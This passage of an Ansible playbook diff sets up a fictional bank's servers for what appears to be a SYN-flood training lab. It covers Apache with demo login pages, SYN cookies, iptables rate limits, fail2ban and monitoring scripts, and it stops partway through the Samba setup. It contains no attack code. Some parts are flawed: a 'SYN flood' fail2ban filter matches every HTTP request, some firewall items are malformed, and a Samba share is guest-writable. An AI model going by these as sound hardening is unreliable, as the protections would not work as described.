@@ -1,0 +1,1190 @@
+---
+# Banco del Sol - DDoS SYN Flood Scenario
+# Base Configuration Playbook
+# Configura la infraestructura antes del ataque
+
+- name: "Configurar infraestructura base del Banco del Sol"
+  hosts: all
+  become: yes
+  vars:
+    banco_del_sol:
+      domain: "bancodelsol.example.com.uy"
+      admin_email: "admin@bancodelsol.example.com.uy"
+      timezone: "America/Montevideo"
+    
+  tasks:
+    - name: Configurar hostname
+      ansible.builtin.hostname:
+        name: "{{ inventory_hostname }}"
+    
+    - name: Configurar /etc/hosts
+      ansible.builtin.lineinfile:
+        path: /etc/hosts
+        line: "{{ hostvars[item].ansible_host }} {{ item }}"
+      loop: "{{ groups['all'] }}"
+    
+    - name: Configurar timezone
+      community.general.timezone:
+        name: "{{ banco_del_sol.timezone }}"
+
+- name: "Configurar servidor web - Apache/Nginx"
+  hosts: webserver
+  become: yes
+  vars:
+    apache_config:
+      server_name: "www.bancodelsol.example.com.uy"
+      document_root: "/var/www/bancodelsol"
+      log_dir: "/var/log/apache2"
+      max_keepalive_requests: 100
+      keepalive_timeout: 5
+      timeout: 60
+      max_request_workers: 150
+      max_connections_per_child: 1000
+      syn_cookie_protection: true
+      server_tokens: "Prod"
+    
+  tasks:
+    - name: Actualizar paquetes del sistema
+      ansible.builtin.apt:
+        update_cache: yes
+        upgrade: dist
+      tags: packages
+    
+    - name: Instalar Apache y dependencias
+      ansible.builtin.apt:
+        name:
+          - apache2
+          - libapache2-mod-php8.1
+          - php8.1
+          - php8.1-mysql
+          - php8.1-curl
+          - php8.1-json
+          - php8.1-mbstring
+          - php8.1-xml
+          - php8.1-zip
+          - mysql-client
+          - tcpdump
+          - iftop
+          - nethogs
+          - conntrack
+          - fail2ban
+          - iptables-persistent
+          - net-tools
+          - sysstat
+          - htop
+          - curl
+          - wget
+          - nmap
+          - vnstat
+          - ipset
+        state: present
+      tags: packages
+    
+    - name: Crear directorio del sitio web
+      ansible.builtin.file:
+        path: "{{ apache_config.document_root }}"
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0755'
+    
+    - name: Crear pagina principal del Banco del Sol
+      ansible.builtin.copy:
+        content: |
+          <!DOCTYPE html>
+          <html lang="es">
+          <head>
+              <meta charset="UTF-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <title>Banco del Sol - Portal Principal</title>
+              <style>
+                  * { margin: 0; padding: 0; box-sizing: border-box; }
+                  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
+                  .header { background: linear-gradient(135deg, #1a237e 0%, #0d47a1 100%); color: white; padding: 20px 0; text-align: center; }
+                  .logo { font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }
+                  .tagline { font-size: 1.1em; opacity: 0.9; }
+                  .nav { background: #1565c0; padding: 15px 0; text-align: center; }
+                  .nav a { color: white; text-decoration: none; margin: 0 20px; font-size: 1.1em; }
+                  .nav a:hover { text-decoration: underline; }
+                  .main { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
+                  .card { background: white; border-radius: 8px; padding: 30px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+                  .card h2 { color: #1a237e; margin-bottom: 15px; }
+                  .login-form { max-width: 400px; margin: 0 auto; }
+                  .form-group { margin-bottom: 15px; }
+                  .form-group label { display: block; margin-bottom: 5px; color: #333; font-weight: 500; }
+                  .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+                  .btn-primary { background: #1a237e; color: white; padding: 12px 30px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
+                  .btn-primary:hover { background: #0d47a1; }
+                  .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 30px; }
+                  .service-card { background: white; border-radius: 8px; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+                  .service-card h3 { color: #1a237e; margin-bottom: 10px; }
+                  .footer { background: #1a237e; color: white; text-align: center; padding: 20px 0; margin-top: 40px; }
+                  .status-indicator { display: inline-block; width: 10px; height: 10px; background: #4caf50; border-radius: 50%; margin-right: 5px; }
+                  .security-badge { background: #e8f5e9; border: 1px solid #4caf50; padding: 10px 15px; border-radius: 4px; margin-top: 15px; text-align: center; }
+              </style>
+          </head>
+          <body>
+              <div class="header">
+                  <div class="logo">Banco del Sol</div>
+                  <div class="tagline">Tu banco de confianza - Uruguay</div>
+              </div>
+              <div class="nav">
+                  <a href="#">Inicio</a>
+                  <a href="#">Productos</a>
+                  <a href="#">Banca Online</a>
+                  <a href="#">Sucursales</a>
+                  <a href="#">Contacto</a>
+              </div>
+              <div class="main">
+                  <div class="card">
+                      <h2>Bienvenido al Portal Bancario</h2>
+                      <p style="margin-bottom: 20px; color: #666;">
+                          Acceda a sus cuentas de forma segura. Nuestro sistema de seguridad
+                          protege sus datos las 24 horas del dia.
+                      </p>
+                      <div class="login-form">
+                          <form action="/login" method="POST">
+                              <div class="form-group">
+                                  <label for="usuario">Usuario</label>
+                                  <input type="text" id="usuario" name="usuario" placeholder="Ingrese su usuario" required>
+                              </div>
+                              <div class="form-group">
+                                  <label for="password">Contrasena</label>
+                                  <input type="password" id="password" name="password" placeholder="Ingrese su contrasena" required>
+                              </div>
+                              <button type="submit" class="btn-primary">Iniciar Sesion</button>
+                          </form>
+                          <div class="security-badge">
+                              <span class="status-indicator"></span>
+                              Sistema seguro - Conexion cifrada SSL/TLS
+                          </div>
+                      </div>
+                  </div>
+                  <div class="services">
+                      <div class="service-card">
+                          <h3>Cuentas</h3>
+                          <p>Gestione sus cuentas de ahorro y corriente en linea.</p>
+                      </div>
+                      <div class="service-card">
+                          <h3>Transferencias</h3>
+                          <p>Realice transferencias instantaneas a cualquier banco.</p>
+                      </div>
+                      <div class="service-card">
+                          <h3>Pagos</h3>
+                          <p>Pague servicios y facturas de forma rapida y segura.</p>
+                      </div>
+                      <div class="service-card">
+                          <h3>Inversiones</h3>
+                          <p>Consulte sus inversiones y oportunidades de ahorro.</p>
+                      </div>
+                  </div>
+              </div>
+              <div class="footer">
+                  <p>&copy; 2026 Banco del Sol - Todos los derechos reservados</p>
+                  <p style="margin-top: 10px; font-size: 0.9em; opacity: 0.8;">
+                      Montevideo, Uruguay | Atencion al cliente: 0800-BANCO
+                  </p>
+              </div>
+          </body>
+          </html>
+        dest: "{{ apache_config.document_root }}/index.html"
+        owner: www-data
+        group: www-data
+        mode: '0644'
+    
+    - name: Crear pagina de login
+      ansible.builtin.copy:
+        content: |
+          <!DOCTYPE html>
+          <html lang="es">
+          <head>
+              <meta charset="UTF-8">
+              <title>Banco del Sol - Banca Online</title>
+              <style>
+                  body { font-family: 'Segoe UI', sans-serif; background: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+                  .login-container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+                  h1 { color: #1a237e; text-align: center; margin-bottom: 30px; font-size: 1.8em; }
+                  .form-group { margin-bottom: 20px; }
+                  label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
+                  input[type="text"], input[type="password"] { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 6px; font-size: 16px; transition: border-color 0.3s; }
+                  input:focus { border-color: #1a237e; outline: none; }
+                  button { width: 100%; padding: 14px; background: #1a237e; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+                  button:hover { background: #0d47a1; }
+                  .forgot { text-align: center; margin-top: 15px; }
+                  .forgot a { color: #1565c0; text-decoration: none; }
+              </style>
+          </head>
+          <body>
+              <div class="login-container">
+                  <h1>Banco del Sol</h1>
+                  <form action="/api/auth" method="POST">
+                      <div class="form-group">
+                          <label for="username">Usuario</label>
+                          <input type="text" id="username" name="username" required>
+                      </div>
+                      <div class="form-group">
+                          <label for="password">Contrasena</label>
+                          <input type="password" id="password" name="password" required>
+                      </div>
+                      <button type="submit">Acceder</button>
+                  </form>
+                  <div class="forgot"><a href="#">Olvide mi contrasena</a></div>
+              </div>
+          </body>
+          </html>
+        dest: "{{ apache_config.document_root }}/login.html"
+        owner: www-data
+        group: www-data
+        mode: '0644'
+    
+    - name: Crear pagina de banca online
+      ansible.builtin.copy:
+        content: |
+          <!DOCTYPE html>
+          <html lang="es">
+          <head>
+              <meta charset="UTF-8">
+              <title>Banco del Sol - Banca Online</title>
+              <style>
+                  body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; }
+                  .header { background: #1a237e; color: white; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
+                  .user-info { font-size: 0.9em; }
+                  .content { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
+                  .dashboard { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
+                  .account-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+                  .account-card h3 { color: #666; font-size: 0.9em; text-transform: uppercase; margin-bottom: 10px; }
+                  .balance { font-size: 1.8em; color: #1a237e; font-weight: bold; }
+                  .actions { margin-top: 20px; }
+                  .action-btn { background: #1a237e; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px; }
+              </style>
+          </head>
+          <body>
+              <div class="header">
+                  <div><strong>Banco del Sol</strong> - Banca Online</div>
+                  <div class="user-info">Juan Perez | Cuenta: ****1234</div>
+              </div>
+              <div class="content">
+                  <h2>Mis Cuentas</h2>
+                  <div class="dashboard">
+                      <div class="account-card">
+                          <h3>Cuenta Corriente</h3>
+                          <div class="balance">$ 45.230,00</div>
+                      </div>
+                      <div class="account-card">
+                          <h3>Cuenta de Ahorro</h3>
+                          <div class="balance">$ 128.500,00</div>
+                      </div>
+                      <div class="account-card">
+                          <h3>Inversiones</h3>
+                          <div class="balance">$ 890.000,00</div>
+                      </div>
+                  </div>
+                  <div class="actions" style="margin-top: 30px;">
+                      <button class="action-btn">Transferir</button>
+                      <button class="action-btn">Pagar Servicios</button>
+                      <button class="action-btn">Consultar Movimientos</button>
+                  </div>
+              </div>
+          </body>
+          </html>
+        dest: "{{ apache_config.document_root }}/banca-online.html"
+        owner: www-data
+        group: www-data
+        mode: '0644'
+    
+    - name: Configurar VirtualHost de Apache
+      ansible.builtin.copy:
+        content: |
+          <VirtualHost *:80>
+              ServerName {{ apache_config.server_name }}
+              ServerAlias bancodelsol.example.com.uy
+              DocumentRoot {{ apache_config.document_root }}
+              
+              # Security Headers
+              Header always set X-Content-Type-Options nosniff
+              Header always set X-Frame-Options SAMEORIGIN
+              Header always set X-XSS-Protection "1; mode=block"
+              Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
+              
+              # Logging
+              ErrorLog ${APACHE_LOG_DIR}/bancodelsol_error.log
+              CustomLog ${APACHE_LOG_DIR}/bancodelsol_access.log combined
+              
+              # Performance tuning (moderate settings)
+              KeepAlive On
+              KeepAliveTimeout {{ apache_config.keepalive_timeout }}
+              MaxKeepAliveRequests {{ apache_config.max_keepalive_requests }}
+              
+              <Directory {{ apache_config.document_root }}>
+                  Options -Indexes +FollowSymLinks
+                  AllowOverride All
+                  Require all granted
+              </Directory>
+              
+              # Block common attack patterns
+              <DirectoryMatch "\.git|\.env|\.config">
+                  Require all denied
+              </DirectoryMatch>
+              
+              # Error pages
+              ErrorDocument 403 /403.html
+              ErrorDocument 500 /500.html
+          </VirtualHost>
+        dest: /etc/apache2/sites-available/bancodelsol.conf
+        owner: root
+        group: root
+        mode: '0644'
+      notify: Reiniciar Apache
+    
+    - name: Configurar rendimiento de Apache
+      ansible.builtin.copy:
+        content: |
+          # Banco del Sol - Apache Performance Configuration
+          # Configuracion base para el escenario DDoS
+          
+          # MPM Configuration
+          <IfModule mpm_prefork_module>
+              StartServers             5
+              MinSpareServers          5
+              MaxSpareServers         10
+              MaxRequestWorkers      {{ apache_config.max_request_workers }}
+              MaxConnectionsPerChild {{ apache_config.max_connections_per_child }}
+          </IfModule>
+          
+          # Timeouts
+          Timeout {{ apache_config.timeout }}
+          KeepAlive On
+          KeepAliveTimeout {{ apache_config.keepalive_timeout }}
+          MaxKeepAliveRequests {{ apache_config.max_keepalive_requests }}
+          
+          # Server tuning
+          ServerTokens {{ apache_config.server_tokens }}
+          ServerSignature Off
+          
+          # Logging
+          LogLevel warn
+          
+          # Security
+          TraceEnable Off
+          FileETag None
+          
+          # Compression (if mod_deflate loaded)
+          <IfModule mod_deflate.c>
+              AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css application/javascript
+          </IfModule>
+          
+          # Caching
+          <IfModule mod_expires.c>
+              ExpiresActive On
+              ExpiresByType text/html "access plus 1 hour"
+              ExpiresByType text/css "access plus 1 week"
+              ExpiresByType application/javascript "access plus 1 week"
+          </IfModule>
+        dest: /etc/apache2/conf-available/performance.conf
+        owner: root
+        group: root
+        mode: '0644'
+      notify: Reiniciar Apache
+    
+    - name: Habilitar modulos necesarios de Apache
+      ansible.builtin.shell: |
+        a2enmod headers
+        a2enmod expires
+        a2enmod deflate
+        a2enmod rewrite
+        a2ensite bancodelsol.conf
+        a2dissite 000-default.conf
+      changed_when: true
+      notify: Reiniciar Apache
+    
+    - name: Configurar SYN cookies y parametros de red
+      ansible.posix.sysctl:
+        name: "{{ item.key }}"
+        value: "{{ item.value }}"
+        sysctl_set: yes
+        state: present
+        reload: yes
+      loop:
+        - { key: 'net.ipv4.tcp_syncookies', value: '1' }
+        - { key: 'net.ipv4.tcp_max_syn_backlog', value: '2048' }
+        - { key: 'net.ipv4.tcp_synack_retries', value: '2' }
+        - { key: 'net.ipv4.tcp_syn_retries', value: '5' }
+        - { key: 'net.ipv4.tcp_fin_timeout', value: '30' }
+        - { key: 'net.ipv4.tcp_keepalive_time', value: '600' }
+        - { key: 'net.ipv4.tcp_keepalive_intvl', value: '30' }
+        - { key: 'net.ipv4.tcp_keepalive_probes', value: '3' }
+        - { key: 'net.core.somaxconn', value: '65535' }
+        - { key: 'net.core.netdev_max_backlog', value: '65536' }
+        - { key: 'net.ipv4.tcp_max_tw_buckets', value: '1440000' }
+        - { key: 'net.ipv4.tcp_tw_reuse', value: '1' }
+        - { key: 'net.ipv4.ip_local_port_range', value: '1024 65535' }
+        - { key: 'net.ipv4.tcp_rmem', value: '4096 87380 16777216' }
+        - { key: 'net.ipv4.tcp_wmem', value: '4096 65536 16777216' }
+        - { key: 'net.core.rmem_max', value: '16777216' }
+        - { key: 'net.core.wmem_max', value: '16777216' }
+        - { key: 'net.netfilter.nf_conntrack_max', value: '262144' }
+        - { key: 'net.netfilter.nf_conntrack_tcp_timeout_established', value: '1200' }
+        - { key: 'net.netfilter.nf_conntrack_tcp_timeout_time_wait', value: '30' }
+        - { key: 'net.netfilter.nf_conntrack_tcp_timeout_close_wait', value: '15' }
+        - { key: 'net.netfilter.nf_conntrack_tcp_timeout_fin_wait', value: '30' }
+      tags: sysctl
+    
+    - name: Configurar iptables - reglas base de seguridad
+      ansible.builtin.iptables:
+        chain: "{{ item.chain }}"
+        source: "{{ item.source | default(omit) }}"
+        destination: "{{ item.destination | default(omit) }}"
+        jump: "{{ item.jump }}"
+        protocol: "{{ item.protocol | default(omit) }}"
+        destination_port: "{{ item.destination_port | default(omit) }}"
+        ctstate: "{{ item.ctstate | default(omit) }}"
+        comment: "{{ item.comment | default(omit) }}"
+      loop:
+        - { chain: INPUT, jump: ACCEPT, ctstate: ESTABLISHED, RELATED, comment: "Allow established connections" }
+        - { chain: INPUT, jump: ACCEPT, protocol: tcp, destination_port: "22", source: "10.10.0.0/24", comment: "SSH from management only" }
+        - { chain: INPUT, jump: ACCEPT, protocol: tcp, destination_port: "80", comment: "Allow HTTP" }
+        - { chain: INPUT, jump: ACCEPT, protocol: tcp, destination_port: "443", comment: "Allow HTTPS" }
+        - { chain: INPUT, jump: ACCEPT, protocol: icmp, comment: "Allow ICMP" }
+        - { chain: INPUT, jump: LOG, comment: "Log dropped packets", extra: "--log-prefix \"IPTables-Dropped: \"" }
+        - { chain: INPUT, jump: DROP, comment: "Drop all other input" }
+      tags: firewall
+    
+    - name: Guardar reglas de iptables
+      ansible.builtin.shell: |
+        iptables-save > /etc/iptables/rules.v4
+      changed_when: true
+      tags: firewall
+    
+    - name: Configurar fail2ban - jail principal
+      ansible.builtin.copy:
+        content: |
+          # Banco del Sol - fail2ban Configuration
+          # Configuracion para proteccion contra ataques comunes
+          
+          [DEFAULT]
+          bantime = 3600
+          findtime = 600
+          maxretry = 5
+          backend = systemd
+          banaction = iptables-multiport
+          
+          # Ban everyone who exceeds maxretry for 1 hour
+          ignoreip = 127.0.0.1/8 10.10.0.0/24
+          
+          # Apache authentication and request limits
+          [apache-auth]
+          enabled = true
+          port = http,https
+          filter = apache-auth
+          logpath = /var/log/apache2/bancodelsol_error.log
+          maxretry = 6
+          findtime = 300
+          bantime = 1800
+          
+          # Limit requests per IP
+          [apache-limit-req]
+          enabled = true
+          port = http,https
+          filter = apache-limit-req
+          logpath = /var/log/apache2/bancodelsol_error.log
+          maxretry = 10
+          findtime = 120
+          bantime = 600
+          
+          # Detect SYN flood patterns
+          [apache-synflood]
+          enabled = true
+          port = http,https
+          filter = apache-synflood
+          logpath = /var/log/apache2/bancodelsol_access.log
+          maxretry = 100
+          findtime = 10
+          bantime = 3600
+          
+          # SSH brute force
+          [sshd]
+          enabled = true
+          port = ssh
+          filter = sshd
+          logpath = /var/log/auth.log
+          maxretry = 5
+          findtime = 300
+          bantime = 3600
+          
+          # Block IPs with too many 404 errors (scanning)
+          [apache-noscript]
+          enabled = true
+          port = http,https
+          filter = apache-noscript
+          logpath = /var/log/apache2/bancodelsol_access.log
+          maxretry = 5
+          findtime = 300
+          bantime = 1800
+          
+          # Block aggressive scanners
+          [apache-badbots]
+          enabled = true
+          port = http,https
+          filter = apache-badbots
+          logpath = /var/log/apache2/bancodelsol_access.log
+          maxretry = 2
+          findtime = 300
+          bantime = 86400
+        dest: /etc/fail2ban/jail.local
+        owner: root
+        group: root
+        mode: '0644'
+      notify: Reiniciar fail2ban
+    
+    - name: Crear filtro fail2ban para SYN flood
+      ansible.builtin.copy:
+        content: |
+          # fail2ban filter for SYN flood attacks
+          # Matches excessive SYN requests from a single IP
+          
+          [Definition]
+          
+          # Match lines with high frequency of requests
+          failregex = ^<HOST> .* "(GET|POST|HEAD) .*" (200|301|302|400|403|404|500|503) .*$
+          
+          ignoreregex =
+          
+          datepattern = %%d/%%b/%%Y:%%H:%%M:%%S
+        dest: /etc/fail2ban/filter.d/apache-synflood.conf
+        owner: root
+        group: root
+        mode: '0644'
+      notify: Reiniciar fail2ban
+    
+    - name: Configurar Rate Limiting en iptables
+      ansible.builtin.shell: |
+        # Limpiar reglas existentes de rate limiting
+        iptables -D INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP 2>/dev/null || true
+        iptables -D INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j DROP 2>/dev/null || true
+        
+        # Connection limit per IP (50 concurrent connections)
+        iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 --connlimit-mask 32 -j DROP
+        iptables -I INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 --connlimit-mask 32 -j DROP
+        
+        # SYN rate limit - 25 SYN packets per second per IP
+        iptables -I INPUT -p tcp --syn --dport 80 -m hashlimit --hashlimit-above 25/sec --hashlimit-burst 50 --hashlimit-mode srcip --hashlimit-name syn_flood_80 -j DROP
+        iptables -I INPUT -p tcp --syn --dport 443 -m hashlimit --hashlimit-above 25/sec --hashlimit-burst 50 --hashlimit-mode srcip --hashlimit-name syn_flood_443 -j DROP
+        
+        # Log SYN flood attempts
+        iptables -I INPUT -p tcp --syn --dport 80 -m hashlimit --hashlimit-above 100/sec --hashlimit-burst 150 --hashlimit-mode srcip --hashlimit-name syn_flood_log_80 -j LOG --log-prefix "SYNFLOOD: "
+        iptables -I INPUT -p tcp --syn --dport 443 -m hashlimit --hashlimit-above 100/sec --hashlimit-burst 150 --hashlimit-mode srcip --hashlimit-name syn_flood_log_443 -j LOG --log-prefix "SYNFLOOD: "
+      changed_when: true
+      tags: firewall_ratelimit
+    
+    - name: Crear script de monitoreo de red
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - Network Traffic Monitor
+          # Monitorea trafico de red en tiempo real
+          
+          LOG_DIR="/var/log/bancodelsol"
+          mkdir -p "$LOG_DIR"
+          
+          echo "=== Banco del Sol - Monitor de Trafico ==="
+          echo "Inicio: $(date)"
+          echo ""
+          
+          # Capturar estadisticas basicas
+          echo "--- Interfaces de red ---"
+          ip -s link show
+          echo ""
+          
+          # Capturar conexiones activas
+          echo "--- Conexiones activas ---"
+          ss -s
+          echo ""
+          
+          # Estado de puertos
+          echo "--- Estado de puertos ---"
+          ss -tuln
+          echo ""
+          
+          # Capturar trafico SYN
+          echo "--- Capturando trafico SYN (10 segundos) ---"
+          timeout 10 tcpdump -i any 'tcp[tcpflags] & (tcp-syn) != 0' -c 100 2>/dev/null
+          echo ""
+          
+          # Estadisticas de conexion
+          echo "--- Estadisticas de conexion TCP ---"
+          cat /proc/net/sockstat
+          echo ""
+          
+          # Tabla de conntrack
+          if [ -f /proc/net/nf_conntrack ]; then
+              echo "--- Conntrack entries ---"
+              cat /proc/net/nf_conntrack | wc -l
+              echo "Max: $(sysctl -n net.netfilter.nf_conntrack_max)"
+          fi
+          
+          echo ""
+          echo "=== Fin del reporte ==="
+        dest: /usr/local/bin/netmonitor.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Crear script de baseline traffic
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - Baseline Traffic Generator
+          # Genera trafico normal para tener un baseline
+      
+          WEB_SERVER="10.10.1.10"
+          DURATION=300  # 5 minutes
+          
+          echo "=== Generando trafico baseline ==="
+          echo "Servidor objetivo: $WEB_SERVER"
+          echo "Duracion: $DURATION segundos"
+          echo ""
+      
+          # Simular trafico web normal
+          for i in $(seq 1 $DURATION); do
+              # Requests HTTP normales
+              curl -s -o /dev/null "http://$WEB_SERVER/" &
+              curl -s -o /dev/null "http://$WEB_SERVER/login.html" &
+              
+              # Variacion en timing
+              sleep $(echo "scale=2; $RANDOM/32768" | bc)
+      
+              # Progreso cada 30 segundos
+              if (( i % 30 == 0 )); then
+                  echo "[$(date)] Completado: $i/$DURATION segundos"
+              fi
+          done
+      
+          echo ""
+          echo "=== Trafico baseline generado ==="
+        dest: /usr/local/bin/generate_baseline.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Configurar coleccion de metricas
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Banco del Sol - Performance Metrics Collector
+          # Recolecta metricas del sistema para analisis
+      
+          LOG_DIR="/var/log/bancodelsol/metrics"
+          mkdir -p "$LOG_DIR"
+          TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+      
+          echo "=== Banco del Sol - Recoleccion de Metricas ==="
+          echo "Timestamp: $TIMESTAMP"
+      
+          # CPU Usage
+          echo "--- CPU Usage ---"
+          top -bn1 | head -5
+      
+          # Memory Usage
+          echo "--- Memory Usage ---"
+          free -h
+      
+          # Network Stats
+          echo "--- Network Stats ---"
+          cat /proc/net/dev
+      
+          # Connection States
+          echo "--- Connection States ---"
+          ss -s
+      
+          # Apache Status
+          echo "--- Apache Status ---"
+          systemctl status apache2 --no-pager || true
+      
+          # Active Connections
+          echo "--- Active TCP Connections ---"
+          ss -tn state established | wc -l
+      
+          # SYN_RECV Connections
+          echo "--- SYN_RECV Connections ---"
+          ss -tn state syn-recv | wc -l
+      
+          # Save metrics to file
+          {
+              echo "timestamp=$TIMESTAMP"
+              echo "cpu_usage=$(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')"
+              echo "mem_usage=$(free | awk '/Mem:/ {printf \"%.2f\", $3/$2 * 100}')"
+              echo "tcp_established=$(ss -tn state established | wc -l)"
+              echo "tcp_syn_recv=$(ss -tn state syn-recv | wc -l)"
+              echo "tcp_time_wait=$(ss -tn state time-wait | wc -l)"
+          } > "$LOG_DIR/metrics_$TIMESTAMP.log"
+      
+          echo "Metricas guardadas en: $LOG_DIR/metrics_$TIMESTAMP.log"
+          echo "=== Fin de recoleccion ==="
+        dest: /usr/local/bin/collect_metrics.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Configurar servicio de recoleccion periodica
+      ansible.builtin.copy:
+        content: |
+          # Banco del Sol - Cron job para metricas
+          # Recolecta metricas cada minuto
+          
+          * * * * * /usr/local/bin/collect_metrics.sh >> /var/log/bancodelsol/metrics/cron.log 2>&1
+          
+          # Backup de logs cada hora
+          0 * * * * tar -czf /var/log/bancodelsol/logs_backup_$(date +\%Y\%m\%d_\%H\%M\%S).tar.gz /var/log/apache2/ /var/log/bancodelsol/ 2>/dev/null
+        dest: /etc/cron.d/bancodelsol-metrics
+        owner: root
+        group: root
+        mode: '0644'
+    
+    - name: Configurar limite de archivos abiertos
+      ansible.builtin.copy:
+        content: |
+          # Banco del Sol - File Limits
+          * soft nofile 65535
+          * hard nofile 65535
+          root soft nofile 65535
+          root hard nofile 65535
+          www-data soft nofile 65535
+          www-data hard nofile 65535
+        dest: /etc/security/limits.d/bancodelsol.conf
+        owner: root
+        group: root
+        mode: '0644'
+    
+    - name: Instalar paquetes adicionales de monitoreo
+      ansible.builtin.apt:
+        name:
+          - iptraf-ng
+          - nload
+          - iftop
+          - nethogs
+          - bmon
+          - vnstat
+          - collectd
+        state: present
+      tags: monitoring
+    
+    - name: Inicializar vnstat
+      ansible.builtin.shell: |
+        systemctl enable vnstat
+        systemctl start vnstat
+      changed_when: true
+      tags: monitoring
+    
+    - name: Verificar servicios instalados
+      ansible.builtin.shell: |
+        echo "=== Verificacion de servicios ==="
+        echo "Apache: $(systemctl is-active apache2)"
+        echo "fail2ban: $(systemctl is-active fail2ban)"
+        echo "iptables rules: $(iptables -L INPUT -n | wc -l)"
+        echo "SYN cookies: $(sysctl -n net.ipv4.tcp_syncookies)"
+        echo "Conntrack max: $(sysctl -n net.netfilter.nf_conntrack_max)"
+        echo "=== Fin verificacion ==="
+      register: service_check
+      changed_when: false
+    
+    - name: Mostrar estado de servicios
+      ansible.builtin.debug:
+        var: service_check.stdout_lines
+
+  handlers:
+    - name: Reiniciar Apache
+      ansible.builtin.systemd:
+        name: apache2
+        state: restarted
+    
+    - name: Reiniciar fail2ban
+      ansible.builtin.systemd:
+        name: fail2ban
+        state: restarted
+
+- name: "Configurar servidor de correo"
+  hosts: mailserver
+  become: yes
+  
+  tasks:
+    - name: Instalar paquetes de correo
+      ansible.builtin.apt:
+        name:
+          - postfix
+          - dovecot-core
+          - dovecot-imapd
+          - mailutils
+        state: present
+    
+    - name: Configurar Postfix basico
+      ansible.builtin.copy:
+        content: |
+          # Postfix configuration for Banco del Sol
+          myhostname = mail.bancodelsol.example.com.uy
+          mydomain = bancodelsol.example.com.uy
+          myorigin = $mydomain
+          mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
+          relay_domains =
+          mynetworks = 127.0.0.0/8, 10.10.0.0/24, 10.10.1.0/24, 10.10.2.0/24
+          mailbox_size_limit = 0
+          recipient_delimiter = +
+          inet_interfaces = all
+          smtpd_banner = $myhostname ESMTP
+        dest: /etc/postfix/main.cf
+        owner: root
+        group: root
+        mode: '0644'
+      notify: Reiniciar Postfix
+    
+    - name: Configurar Dovecot basico
+      ansible.builtin.copy:
+        content: |
+          protocols = imap
+          listen = *, ::
+          ssl = required
+          ssl_cert = </etc/ssl/certs/ssl-cert-snakeoil.pem
+          ssl_key = </etc/ssl/private/ssl-cert-snakeoil.key
+          mail_location = maildir:/var/mail/%u
+          namespace inbox {
+              inbox = yes
+              mailbox Drafts { special_use = \Drafts; auto = subscribe; }
+              mailbox Junk { special_use = \Junk; auto = subscribe; }
+              mailbox Sent { special_use = \Sent; auto = subscribe; }
+              mailbox Trash { special_use = \Trash; auto = subscribe; }
+          }
+        dest: /etc/dovecot/dovecot.conf
+        owner: root
+        group: root
+        mode: '0644'
+      notify: Reiniciar Dovecot
+    
+    - name: Asegurar servicios de correo
+      ansible.builtin.systemd:
+        name: "{{ item }}"
+        state: started
+        enabled: yes
+      loop:
+        - postfix
+        - dovecot
+  
+  handlers:
+    - name: Reiniciar Postfix
+      ansible.builtin.systemd:
+        name: postfix
+        state: restarted
+    
+    - name: Reiniciar Dovecot
+      ansible.builtin.systemd:
+        name: dovecot
+        state: restarted
+
+- name: "Configurar servidor de archivos"
+  hosts: fileserver
+  become: yes
+  
+  tasks:
+    - name: Instalar paquetes
+      ansible.builtin.apt:
+        name:
+          - samba
+          - samba-common-bin
+          - nfs-kernel-server
+        state: present
+    
+    - name: Configurar Samba basico
+      ansible.builtin.copy:
+        content: |
+          [global]
+              workgroup = BANCODELSOL
+              server string = File Server - Banco del Sol
+              security = user
+              map to guest = Bad User
+              log file = /var/log/samba/log.%m
+              max log size = 50
+              dns proxy = no
+          
+          [publico]
+              path = /srv/samba/publico
+              browseable = yes
+              read only = no
+              guest ok = yes
+              create mask = 0775
+              directory mask = 0775
+          
+          [datos]
+              path = /srv/samba/datos
+              browseable = yes
+              read only = no
+              guest ok = no
+              valid users = @banco
+              create mask = 0770
+              directory mask = 0770
+        dest: /etc/samba/smb.conf
+        owner: root
+        group: root
+        mode: '0644'
+    
+    - name: Crear directorios compartidos
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: directory
+        owner: nobody
+        group: nogroup
+        mode: '0775'
+      loop:
+        - /srv/samba/publico
+        - /srv/samba/datos
+    
